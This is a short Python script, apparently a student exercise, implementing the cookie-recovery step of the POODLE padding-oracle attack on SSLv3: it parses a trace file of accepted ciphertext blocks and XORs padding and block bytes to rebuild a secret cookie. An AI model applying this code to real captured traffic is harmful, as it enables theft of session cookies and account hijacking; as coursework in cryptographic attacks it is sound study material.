#Poodle attack by Simen Andersen
#Email: SimAnd48374@stud.noroff.no


from textwrap import wrap
import sys

file = sys.argv[1]

def read_file(file):
    accepted_lines = []
    with open(file, "r") as f:
        for line in f:
            line = line.split(",")
            if len(line) > 1:
                line[1] = line[1].rstrip()
                if (line[1] == "ACCEPTED"):
                    accepted_lines.append(line[0])
            elif len(line) == 1:
                line[0] = line[0].rstrip()
                accepted_lines.append(line)
        f.close()

    return accepted_lines


def calculate_cookie(c_rminone, block):
    block = block.split(" ")
    c_rminone_block = block[c_rminone -1]
    c_nminone_block = block[(len(block) - 1)-1] #goes to index number 14 wich is block number 15

    c_rminone_block = wrap(c_rminone_block, 2)
    c_nminone_block = wrap(c_nminone_block, 2)

    
    hex_cr = c_rminone_block[len(c_rminone_block) -1]
    hex_cn = c_nminone_block[len(c_nminone_block) -1]
    
    #convert from hex to int for XOR
    hex_cr_int = int(hex_cr, 16)
    hex_cn_int = int(hex_cn, 16)

    padding_int = 15

    mr = padding_int ^ hex_cr_int
    mr = mr ^ hex_cn_int

    return chr(mr)
    
    


def main():
    traces = read_file(file)
    cookie = ""
    
    ssl_size = traces[0]
    c_r = traces[1]
    
    c_rminone = int(c_r[0]) - 1

    traces.pop(0)
    traces.pop(0) #remove the size and the c_r from the trace file to leave only the blocks.

    for block in traces:
        cookie += str(calculate_cookie(c_rminone, block))

    cookie = cookie[::-1]
    print(f"Cookie: {cookie}")


if __name__ == "__main__":
    main()
